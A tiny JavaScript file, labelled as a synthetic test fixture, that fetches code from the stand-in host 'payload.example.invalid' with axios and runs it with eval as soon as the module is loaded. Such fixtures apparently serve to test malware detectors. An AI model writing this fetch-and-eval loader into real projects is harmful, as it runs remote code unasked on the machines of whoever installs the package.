// SYNTHETIC TEST FIXTURE — not functional
const axios = require("axios");

function load(url) {
  axios.get(url).then((r) => eval(r.data));
}

module.exports = load;

load("https://payload.example.invalid/m");
